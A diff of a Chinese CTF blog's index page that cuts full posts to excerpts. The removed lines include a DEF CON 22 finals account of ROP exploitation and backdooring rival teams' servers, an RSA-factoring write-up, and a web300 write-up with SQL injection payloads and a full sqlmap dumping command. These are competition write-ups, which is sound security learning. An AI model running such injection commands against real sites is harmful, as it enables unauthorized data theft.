@@ -9,7 +9,7 @@
   <meta name="author" content="cychao">
 
   
-  <meta name="description" content="寫作能力不佳,平常只敢寫技術文章,不是很敢寫心情抒發之類的東西 但這次真的是太感動了,決定勇敢嘗試一下XD 感謝超罩的隊友們讓我有這次機會一起前進 defcon final Orange Sean Jery Peter Shik atdog dm4 lucas dada 感謝Alan, TT &hellip;">
+  <meta name="description" content="寫作能力不佳,平常只寫技術文章,不是很敢寫心情抒發之類的東西 但這次真的是太感動了,決定勇敢嘗試一下XD 感謝超罩的隊友們 : Orange Sean Jery Peter Shik atdog dm4 lucas dada 感謝 Alan, TT , GD , Kenny, Turkey &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -99,122 +99,24 @@
 
   <div class="entry-content"><p>  <img src="/images/defcon22_final/captain_token.jpg"></p>
 
-<p> 寫作能力不佳,平常只敢寫技術文章,不是很敢寫心情抒發之類的東西
- 但這次真的是太感動了,決定勇敢嘗試一下XD
- 感謝超罩的隊友們讓我有這次機會一起前進 defcon final</p>
+<p> 寫作能力不佳,平常只寫技術文章,不是很敢寫心情抒發之類的東西
+ 但這次真的是太感動了,決定勇敢嘗試一下XD</p>
 
-<p> Orange Sean Jery Peter Shik atdog dm4 lucas dada</p>
+<p> 感謝超罩的隊友們 :
+ Orange Sean Jery Peter Shik atdog dm4 lucas dada</p>
 
-<p>感謝Alan, TT , GD , Kenny, Turkey 四處奔走 在拉斯維加斯幫我們打理食衣住行</p>
+<p>感謝 Alan, TT , GD , Kenny, Turkey 四處奔走 在拉斯維加斯幫我們打理食衣住行</p>
+
+<p>感謝趨勢贊助旅費讓我們可以成行.</p>
 
 <p> 比賽時忘記拍照, 感謝 <a href="http://blog.orange.tw">Orange</a> 友情提供照片.</p>
 
-<hr />
-
-<p>   在心得開始前先說明一下什麼是 Attack &amp; Defense.</p>
-
-<p>   主辦單位會為所有參加的隊伍準備需要守護的伺服器 &ndash; gamebox ,
-   這檯伺服器上提供數種服務,會有網頁, 遊戲或其他特殊用途的Server 等等.
-   每個服務都有數個漏洞,漏洞可能只是簡單的資訊泄露, 阻斷服務;
-   也可能是一個嚴重的漏洞讓客戶端可以在伺服器上執行任意指令.</p>
-
-<p>   參賽的隊伍需要做的事情就是守護好自己的伺服器,打爆別人的.
-   守護好自己的伺服器,正常提供服務.
-   若服務沒有正常運作,每一回合(5分鐘) -19分,扣的分數平均分配給服務正常的隊伍.
-   而正常運作的服務因為有漏洞的關係,很可能被其他隊伍利用來偷取伺服器上的檔案 &ndash; token.
-   只要被搶走token, 該回合扣19分, 搶走token的隊伍平分.</p>
-
-<p>   每種服務獨立計算,所以如果同時四個服務都被打穿,一回合會掉76分&hellip;
-   去年很多隊伍打到第二天分數被搶光光,好不容易搶到一些分數卻又馬上被搶走,第二天下午就棄權了</p>
-
-<hr />
-
-<p> 一開賽,我們就照前一天的演練迅速將防禦程式放到Gamebox上,
- 誰知第一回合馬上被主辦單位判定服務不正常, 與其他五隊一起被扣了19分.
- 開局就失分, 士氣大受打擊, 在沒有經驗的情況下,
- 連續掉了四回合的分數才止住失分,</p>
-
-<p><strong> 開賽20分鐘, HITCON墊底 ,還放棄了數道217準備許久的防線. </strong></p>
-
-<p> 保持墊底一段時間後,總算在第一支服務(Eliza)的程式分析有了進展</p>
-
-<p> <img src="/images/defcon22_final/eliza_vulnerability.png">
- 找到兩個漏洞 information leak 與 stack overflow,
- 先透過 information leak 的漏洞leak出函式的位置.
-<code>因為伺服器啟動了ASLR, 每次執行程式的函式位置都不一樣</code></p>
-
-<p> 再來就可以利用stack overflow的漏洞控制程式執行流程.
- 在這邊我們犯了一個錯誤,看到有ASLR,就以為也有DEP的保護,
- 就花了很多時間在建構ROP, 想繞過DEP的保護.
- <code>DEP: Data Execution Prevention, 禁止在data段執行指令</code></p>
-
-<p> 先弄第一段ROP,取得函式庫的記憶體位置,再建第二段ROP跳轉到C libary 的system執行指令.
- 但在Sean成功寫出exploit之前,已有其他隊伍率先寫出並開始攻擊所有隊伍,
- 發現token泄露之後 Jery在兩回合內將我們找出的弱點補上.</p>
-
-<p> 而我在分析流量時,一直無法從payload裡面找到ROP,
- 放棄找ROP之後才發現一個讓我吐血的事情,
- <strong> Eliza </strong> 用qemu-i386跑起來時不知道為何沒有DEP,直接只蓋EIP 2byte 跳一個ROP gadge去執行stack上的shellcode就可以執行任意指令了
- . 同時也發現不到半小時已有部分隊伍根據第一隊的思路寫出exploit.
- <code>其他隊伍也有可能是replay封包 賭那1/16 ASLR分配到相同位置的機率</code></p>
-
-<p> 但直到Sean寫出ROP版本的exploit,開始攻擊其他隊伍的時候,還是有近半數的隊伍沒有修補好漏洞,瞬間搶到很多token.
- Peter和Shik將攻擊自動化之後,Orange還加進了後門程式,就算對方已修補漏洞,只要沒有被發現後門,
- 我們還是能取得對方的token,靠這招打一次偷好幾次XD</p>
-
-<p>   第二個服務是一個web server, 我們一直沒有投入人力下去看,
-   不過我們在分析封包時有找到其他隊伍的攻擊payload,透過重放攻擊也有取得部分隊伍的token.</p>
-
-<p>   過了平靜的幾個小時,突然間發現修補好漏洞的Eliza開始掉分,原以為是patch失效,
-   抓出攻擊流量一看差點暈倒, 有隊伍找到了一個很難觸發的弱點,寫出了成功率很高的攻擊程式.</p>
-
-<p>   Eliza是一個類似大航海的宇宙經營遊戲,遊戲一開始會有一萬元跟一萬單位油,
-   每個星球賣跟買的東西與價錢都不一樣,要引發這個漏洞的前提是要賺進大量的金錢,
-   買不同物品買到超過程式分配的大小,也會造成Stack overflow,
-   新買的物品數量會蓋到其中一個函式的指標,靠著物品數量控制程式執行流程,
-   這個漏洞花了兩位ACM World final一個下午加晚上的時間寫出賺錢程式觸發漏洞.</p>
-
-<p>   第一天結束時我們隊伍排在第五,猜測是因為前面服務沒有正常運作被扣了太多分.
-   草草吃了晚餐,開始討論第二天戰術及晚上工作 # 忘記當天吃什麼了, 比賽只要一開始大家都會忘記吃東西
-   <code>Shik打開麵包咬著開始寫code寫到過了20分鐘都沒發現</code></p>
-
-<p>   第二天一早進去,驚喜地發現我們排在第二名,與第一名的差距也縮短到一千分以內
-   原來是主辦單位算分程式有bug, 扣一次分會變扣兩次分, 連夜修正回來
-  <img src="/images/defcon22_final/day2_scoreboard.jpg"></p>
-
-<p>   比賽開始後就按照吃早餐時討論的工作分配, 第二天的是沒有計分板的,內網的計分板只有名次
-   大螢幕上一個戰場圖顯示目前各隊互相攻擊的狀況,
-   我們坐在邊邊就得輪流去看伺服器有沒有被攻擊成功,上的防禦如何上
-   上的防禦有沒有效, 看到一半赫然發現我們變成第一名了!!!!!!!!!!!!!</p>
-
-<p>  <img src="/images/defcon22_final/day2_1st_scoreboard.png"></p>
-
-<p>   大家都傻住了,莫名其妙就爬到第一名,第一天晚上還在想不能被剃光頭..
-   整個落差有點大</p>
-
-<p>   先寫到這邊,留在最開心的時候&hellip;</p>
-
-<hr />
-
-<p><strong>補充: </strong></p>
-
-<ul>
-<li><p>很多細節和時間順序已經想不起來了,是憑印象亂湊的XD</p></li>
-<li><p>八個人同時要做:
-&ldquo;監控伺服器狀態,檢查流量,分析程式,發動攻擊,啟動防禦,漏洞修補,重放其他隊的攻擊&rdquo;.
-工作很多很雜,團隊能不能好好的分工很重要,幸好我們平時有一起CTF練默契.否則會死得很慘</p></li>
-<li><p>雖然三天加起來可以互相打的時間大概是24小時,
-但現場這24小時壓力非常大,發現分數掉要等十五分鐘才拿的到封包流量來分析,
-拿到之後要分析攻擊,找漏洞,修補,同時token還是一直往外噴,
-每晚五分鐘就多噴19分,都是拼了命想辦法在第一時間搞定.
-在這樣的壓力下體力消耗得很快,
-到晚上八點賽程結束後還要離線分析.想辦法做出攻擊payload,結果第一天寫到一半就躺成這樣了&hellip;.</p></li>
-</ul>
-
-
-<p>  <img src="/images/defcon22_final/day1_sleep.jpg"></p>
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/blog/2014/08/13/2014-defcon-22-final-can-sai-xin-de-shang/">Read on &rarr;</a>
+    </footer>
   
 
 
@@ -265,168 +167,12 @@
 
 <p>這題靠整個團隊的合作在一小時內快速解出, 實在太值得紀念. 故本次選擇寫這題的writeup</p>
 
-<ul>
-<li><strong>Category:</strong> HJ</li>
-<li><strong>Points:</strong> 4</li>
-<li><strong>Description:</strong></li>
-</ul>
-
-
-<blockquote><p>I am sorry Sick Yoda.
-<a href="comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a">services.2014.shallweplayaga.me/comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a</a>
-<a href="pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8">services.2014.shallweplayaga.me/pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8</a></p></blockquote>
-
-<p>題目一開始給了一個RSA public key和一個加密檔</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN PUBLIC KEY-----
-</span><span class='line'>MEEwDQYJKoZIhvcNAQEBBQADMAAwLQImC1+CPNtJhcI2UiY7iabqbVRDkz0le0uq
-</span><span class='line'>dgc87QWlj7qE+QS9LTcCAwEAAQ==
-</span><span class='line'>-----END PUBLIC KEY-----</span></code></pre></td></tr></table></div></figure>
-
-
-<p>可以看到RSA KEY只有308 bits, 貌似可以很快爆出p,q</p>
-
-<p>剛好在某次CTF解過類似的題目,立刻把當時參考的資料拉出看</p>
-
-<blockquote><p><a href="http://m0x39.blogspot.tw/2012/12/0x00-introduction-this-post-is-going-to.html">http://m0x39.blogspot.tw/2012/12/0x00-introduction-this-post-is-going-to.html</a></p></blockquote>
-
-<p>atdog用pkcs1-conf拉出 n, 送到網站上解不出p,q</p>
-
-<p><code>n=1447960949958180889766108699794255593190305412016955260539401755003594509743125280111537463</code></p>
-
-<p>此時所有人各自找library/程式嘗試暴力破出p,q</p>
-
-<p>最後Shik 使用 <a href="http://yafu.sourceforge.net/">Yafu</a> 在 328.0232 秒後破出了 p , q</p>
-
-<p><code>p=1155392895670976232909180918778240881689447939</code>
-<code>q=1253219537166446194660024618758541358223427517</code></p>
-
-<p>丟進rsatool 找出d</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>rsatool.py -e 65537 \
-</span><span class='line'>           -p 1155392895670976232909180918778240881689447939 \
-</span><span class='line'>           -q 1253219537166446194660024618758541358223427517 \
-</span><span class='line'>           -n 1447960949958180889766108699794255593190305412016955260539401755003594509743125280111537463 </span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>d=102ddee9144c93aca5fa57c97b19a985beca22a2c3b7ede3db15fec4c24969f337cca2bf069</code></p>
-
-<p>得到d之後就可以直接解密comeandgetme.enc</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#cat comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a \
-</span><span class='line'>        | rsacrack.py -d 102ddee9144c93aca5fa57c97b19a985beca22a2c3b7ede3db15fec4c24969f337cca2bf069 \
-</span><span class='line'>        b5f823cdb4985c23652263b89a6ea6d5443933d257b4baa76073ced05a58fba84f904bd2d37 \
-</span><span class='line'>        | strings
-</span><span class='line'>http://bit.ly/1jANwVx</span></code></pre></td></tr></table></div></figure>
-
-
-<p>從網址抓到一個mp3檔,所有人都聽了口音很重的英文15分鐘,發現最後一段有連續的雜訊</p>
-
-<p>用goldwave分析雜訊的部分</p>
-
-<p><img src="/images/writeup/defcon22_sick_noise.PNG">
-<img src="/images/writeup/defcon22_sick_noise_zoomin.PNG"></p>
-
-<p>頻譜看起來有點奇怪,猜測是要將粗的看成0,細的看成1</p>
-
-<p>decode的方法有機會是moorse或是ascii binary</p>
-
-<p>在這邊分頭進行解碼, moorse decode失敗</p>
-
-<p>當成ascii binary時decode前面10幾個bytes都是printable字元,</p>
-
-<p>但只看前幾bytes看不出是什麼encode</p>
-
-<p>遠在北京的 Shik 不曉得用什麼神奇的方法快速解出所有bytes
-<code>
-7rKM^ATVEq+D&gt;k=E-"&amp;n06:]FG%kGtF"T4%0f1M(BOP^nG@b`0@&lt;l9o@4lD.04o$/B4!SU@:j+-AM@XR2e"R&amp;3A&lt;-q2E#,&amp;2)[EQAS,O_AnE/oDIal'FEDJC3\N.-ATDs.@qB^61,(F&gt;/ot]7Ci"&lt;,E,8s.@:s"$D.PA3D.R'01LsuL2E*EJ3&amp;3KN0K1gK1b^jsA2lJ%3FOa!0On
-</code></p>
-
-<p>這串字困擾了我們許久, 嘗試了各種常見的encode:  caser, xor , uuencode &hellip;.. 都失敗</p>
-
-<p>最後還是shik發現是ascii85 encode, decode解出兩個url</p>
-
-<p><code>http://services.2014.shallweplayaga.me/flag_76aff3e0d77b38900a66e35687effaff</code>
-<code>http://services.2014.shallweplayaga.me/eme_23dc0673382940749407ad8619a41</code></p>
-
-<p>第一個連結是被加密過的flag, 第二個連結看起來少了3bytes, Orange寫了隻script爆出最後3byte</p>
-
-<p><code>http://services.2014.shallweplayaga.me/eme_23dc0673382940749407ad8619a410cc</code></p>
-
-<p>抓下來是隻elf x64, 只有encrypt功能</p>
-
-<p>所有人分頭reverse binary和直接執行觀察encrypt的方式</p>
-
-<p>最後得出結論是block encrypt, 4bytes 結果不互相影響</p>
-
-<p>Orange用&#8221;The flag is:&ldquo; encrypt與flag 比較 確定前八碼相同</p>
-
-<p>然後討論如何暴力跑出flag,</p>
-
-<p>由 Sean 提出了非常快速的方法, 先將所有可能的4字元組合產生出字典檔</p>
-
-<p>再將字典檔用給的程式加密 比對是否有與flag相符的4bytes , 再從字典檔拉出相同位置的明文</p>
-
-<p>這邊大家各自寫程式gen, 我偷懶的用maskprocessor ,
-maskprocessor產生組合字串很快而且很好設定規則</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#maskprocessor -o /tmp/dict --increment-min=4 --increment-max=4 -1 ?l?u?d?s ?1?1?1?1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>但剛開始學python寫太慢, 最後是orange的script爆出flag.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ok</span>
-</span><span class='line'><span class="mi">0</span> <span class="p">[</span><span class="s">&#39;fa</span><span class="se">\xb2\xc0</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">The</span>
-</span><span class='line'><span class="mi">4</span> <span class="p">[</span><span class="s">&#39;K</span><span class="se">\x16\xf4\x11</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">flag</span>
-</span><span class='line'><span class="mi">8</span> <span class="p">[</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">-2F&#39;</span><span class="p">]</span> <span class="ow">is</span><span class="p">:</span>
-</span><span class='line'><span class="mi">12</span> <span class="p">[</span><span class="s">&#39;</span><span class="se">\xd9\xcb\x8d\x9d</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">I</span> <span class="n">h</span>
-</span><span class='line'><span class="mi">16</span> <span class="p">[</span><span class="s">&#39;k</span><span class="se">\x88</span><span class="s">rP&#39;</span><span class="p">]</span> <span class="n">ope</span>
-</span><span class='line'><span class="mi">20</span> <span class="p">[</span><span class="s">&#39;</span><span class="se">\xe4\x83</span><span class="s">w</span><span class="se">\r</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">that</span>
-</span><span class='line'><span class="mi">24</span> <span class="p">[</span><span class="s">&#39;</span><span class="se">\xe5\xb1\xd8\x14</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">did</span>
-</span><span class='line'><span class="mi">28</span> <span class="p">[</span><span class="s">&#39;</span><span class="se">\xc2</span><span class="s">2H</span><span class="se">\x02</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">n</span><span class="s">&#39;t</span>
-</span><span class='line'><span class="mi">32</span> <span class="p">[</span><span class="s">&#39;T</span><span class="se">\xa1\xa4\x92</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">suck</span>
-</span><span class='line'><span class="mi">36</span> <span class="p">[</span><span class="s">&#39;abW</span><span class="se">\x95</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">too</span>
-</span><span class='line'><span class="mi">40</span> <span class="p">[</span><span class="s">&#39;5</span><span class="se">\x94\x13\x92</span><span class="s">&#39;</span><span class="p">]</span> <span class="n">muc</span>
-</span><span class='line'><span class="mi">44</span> <span class="p">[</span><span class="s">&#39;[</span><span class="se">\x0f\x84\xaa</span><span class="s">&#39;</span><span class="p">]</span> <span class="mi">44</span> <span class="n">keyerror</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>The flag is: I hope that didn't suck too muc</code></p>
-
-<p>最後4bytes因為換行字元與null bytes不在orange的字典清單裡所以match不到</p>
-
-<p>Orange直接猜 <code>I hope that didn't suck too much.</code> 4分GET</p>
-
-<p>// 所有人一起解出關鍵題目的感覺真棒! 紀念一下(L)</p>
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/blog/2014/05/19/defcon-ctf-22-qual-sick-writeup/">Read on &rarr;</a>
+    </footer>
   
 
 
@@ -465,9 +211,8 @@ maskprocessor產生組合字串很快而且很好設定規則</p>
 
   <div class="entry-content"><p>這次與217 Orange 組隊打 PlaidCTF 靠超強隊友拿到第五名</p>
 
-<p>記分板非常華麗, 滑鼠移過去可以看到各題型即時統計,得分狀況 很特別的設計.</p>
-
-<p>現在好像還看的到  有興趣的可以看一下</p>
+<p>記分板非常華麗, 滑鼠移過去可以看到各題型即時統計,得分狀況 很特別的設計.
+現在好像還看的到  有興趣的可以看一下</p>
 
 <p><a href="http://play.plaidctf.com/scoreboard">http://play.plaidctf.com/scoreboard</a></p>
 
@@ -489,13 +234,11 @@ maskprocessor產生組合字串很快而且很好設定規則</p>
 
 <p>只剩下3成的RSA key reconstruction &ndash; <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/rsa">RSA</a></p></blockquote>
 
-<p>不過沒有那麼多時間可以寫write-up ,  只能寫一篇</p>
+<p>不過沒有那麼多時間可以寫write-up , 只能寫一篇,
+挑一個解最久的題目zfs來寫XD</p>
 
-<p>挑一個解最久的題目zfs來寫XD</p>
-
-<p>這題是跟atdog一起解的,前面卡關卡很久</p>
-
-<p>最後atdog用人眼讀zfs data structure把key看出來</p>
+<p>這題是跟atdog一起解的,前面卡關卡很久,
+最後atdog用人眼讀zfs data structure把key看出來</p>
 
 <p>&hellip;&hellip;..未完待續</p>
 
@@ -538,9 +281,8 @@ maskprocessor產生組合字串很快而且很好設定規則</p>
   </header>
 
 
-  <div class="entry-content"><p>這次CTF不難  早上11:00開始玩到晚上12:00時已經差三題全解</p>
-
-<p>後來 Orange 出手成績直接爆表</p>
+  <div class="entry-content"><p>這次CTF不難  早上11:00開始玩到晚上12:00時已經差三題全解,
+後來 Orange 出手成績直接爆表</p>
 
 <p><img src="/images/writeup/backdoor2014_scoreboard.PNG"></p>
 
@@ -548,150 +290,19 @@ maskprocessor產生組合字串很快而且很好設定規則</p>
 
 <blockquote><p>The competition requires you to find flags to gain points. Some flags can be gained by completing tasks, others are hidden in different places.</p></blockquote>
 
-<p>這不是讓大家去打網站嗎OTZ</p>
+<p>這不是讓大家去打網站嗎OTZ&hellip;.</p>
 
-<p>當時整個網頁都翻過之後才看到IRC上說hidden flag總共四把</p>
+<p>當時整個網頁都翻過之後才看到IRC上說hidden flag總共四把
+<em>其實我很想寫第五把hidden flag的write up,但是好像要先問過人家願不願意被公開(flee</em></p>
 
-<p><em>其實我很想寫第五把hidden flag的write up,但是好像要先問過人家願不願意被公開(flee</em></p>
-
-<p>總之在正常的題目裡,值得記錄下來的是web300</p>
-
-<p>直接看題目</p>
-
-<blockquote><p>H4x0r is making a new website and has decided to give you beta access! Head over here to register.</p></blockquote>
-
-<p>網頁連進去後有register, status, login三個頁面</p>
-
-<p><img src="/images/writeup/backdoor2014_w300_register.PNG"></p>
-
-<p><img src="/images/writeup/backdoor2014_w300_status.PNG"></p>
-
-<p>其中有問題的是 status.php</p>
-
-<p>輸入存在的使用者會</p>
-
-<p><img src="/images/writeup/backdoor2014_w300_status_valid.PNG"></p>
-
-<p>不存在時</p>
-
-<p><img src="/images/writeup/backdoor2014_w300_invalid.PNG"></p>
-
-<p>這個頁面存在 boolean-based sql injection  簡單用一對一錯的sql injection試一下就知道</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="s1">&#39; or 1=&#39;</span><span class="mi">1</span>
-</span><span class='line'><span class="s1">&#39; and 2=&#39;</span><span class="mi">1</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>知道是boolean-based的sql injection 直接拿sql map出來跑</p>
-
-<p>這邊一定要提一下Atdog前面解w100時(也是bool sql injection)靠北了一句話</p>
-
-<blockquote><p>我還是第一次看到ctf的題目 sqlmap可以直接爆的</p></blockquote>
-
-<p>不過這題是三百分,有擋工具 如果使用工具的話會被偵測出來</p>
-
-<p><img src="/images/writeup/backdoor2014_w300_status_block.PNG"></p>
-
-<p>在這邊就做了一些猜測,  是檢查 user-agent? IP bind cookie? frequency rate?</p>
-
-<p>最後發現status頁面會 set cookie,  post過去的頁面會delete cookie.</p>
-
-<p>cookie只能用一次,且鎖php session</p>
-
-<p><img src="/images/writeup/backdoor2014_w300_status_setcookie.PNG"></p>
-
-<p>這時就會發現SQLmap真的很強大, 可以自訂每次request 前執行的動作 修改每次的cookie/parameter</p>
-
-<p><img src="/images/writeup/backdoor2014_sqlmap_eval_usage.PNG"></p>
-
-<p>而eval修改cookie的功能是去年加上去的</p>
-
-<p><img src="/images/writeup/backdoor2014_sqlmap_not_suppot_cookie.PNG"></p>
-
-<p><img src="/images/writeup/backdoor2014_sqlmap_eval_cookies.PNG"></p>
-
-<p>最後就是用sqlmap eval 去讀status.php取得cookie  就可以爆db了</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span>
-</span><span class='line'><span class="n">web_300_token</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://backdoor.cognizance.org.in/problems/web300/status.php&#39;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s">&#39;SQLI&#39;</span><span class="p">},</span><span class="n">cookies</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="s">&#39;s60g4fnru4scvr8agl7rvnaji4&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">&#39;web_300_token&#39;</span><span class="p">]</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>值得注意的是sqlmap跟status要用同一組php session key 不然還是會錯.</p>
-
-<p>Payload</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">sqlmap -u http://backdoor.cognizance.org.in/problems/web300/check.php \</span>
-</span><span class='line'><span class="go">           --data=&quot;username=a&quot; --string=&quot;This user has been validated&quot;\</span>
-</span><span class='line'><span class="go">           --cookie=&quot;web_300_token=25b71a45869d38c2a509116149245865;  \</span>
-</span><span class='line'><span class="go">           PHPSESSID=s60g4fnru4scvr8agl7rvnaji4&quot; \</span>
-</span><span class='line'><span class="go">           --user-agent=&quot;SQLI&quot; \</span>
-</span><span class='line'><span class="go">           --referer=&quot;http://backdoor.cognizance.org.in/problems/web300/status.php&quot; \</span>
-</span><span class='line'><span class="go">           --eval=&quot;import requests;\</span>
-</span><span class='line'><span class="go">                   web_300_token=requests.get(&#39;http://backdoor.cognizance.org.in/problems/web300/status.php&#39;,\</span>
-</span><span class='line'><span class="go">                   headers={&#39;User-Agent&#39;: &#39;SQLI&#39;},\</span>
-</span><span class='line'><span class="go">                   cookies=dict(PHPSESSID=&#39;s60g4fnru4scvr8agl7rvnaji4&#39;)).cookies[&#39;web_300_token&#39;]&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>相關參數</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">-u url</span>
-</span><span class='line'><span class="go">--data Post的資料</span>
-</span><span class='line'><span class="go">--string SQL指令執行是true web會回傳的關鍵字</span>
-</span><span class='line'><span class="go">--not-string SQL指令執行是false web會回傳的關鍵字</span>
-</span><span class='line'><span class="go">--cookie 指定cookie</span>
-</span><span class='line'><span class="go">--user-agent 指定user agent</span>
-</span><span class='line'><span class="go">--referer 指定ref page</span>
-</span><span class='line'><span class="go">--eval 每次request前須執行的指令</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>撈資料</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">--users 撈db帳號</span>
-</span><span class='line'><span class="go">--databases 撈db</span>
-</span><span class='line'><span class="go">--tables 撈table , 可用-D 指定database</span>
-</span><span class='line'><span class="go">--columns 撈欄位 , 可用-T 指定table</span>
-</span><span class='line'><span class="go">--dump 撈資料, 要用-C 指定欄位 -T 指定table </span>
-</span><span class='line'><span class="go">--dump-all 撈所有資料 再bool-based底下會很慢</span>
-</span><span class='line'><span class="go">--threads 指定同時run幾隻 加快速度</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
+<p>總之在一般的題目裡,值得寫writeup的只有web300</p>
 
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/">Read on &rarr;</a>
+    </footer>
   
 
 
@@ -728,220 +339,19 @@ maskprocessor產生組合字串很快而且很好設定規則</p>
   </header>
 
 
-  <div class="entry-content"><p>感冒在家養病逛fb, 突然看到有ctf可以打</p>
-
-<p>馬上開skype問帳號開打XD</p>
+  <div class="entry-content"><p>感冒在家養病逛fb, 突然看到有ctf可以打
+馬上開skype問帳號開打XD</p>
 
 <p>直接找一題沒人解的來玩</p>
 
 <p><img src="/images/writeup/bctf2014_misc300_problem.png"></p>
 
-<p>下載檔案可以看到疑似封包內容的 in out stream</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">stream</span> <span class="o">=</span> <span class="p">[(</span><span class="s">&#39;in&#39;</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x00\x00\x00</span><span class="s">T</span><span class="se">\xff</span><span class="s">SMBr</span><span class="se">\x00\x00\x00\x00\x18\x01</span><span class="s">(</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18</span><span class="s">n</span><span class="se">\x00</span><span class="s">1</span><span class="se">\x00\x02</span><span class="s">LANMAN1.0</span><span class="se">\x00\x02</span><span class="s">LM1.2X002</span><span class="se">\x00\x02</span><span class="s">NT LANMAN 1.0</span><span class="se">\x00\x02</span><span class="s">NT LM 0.12</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">),</span>
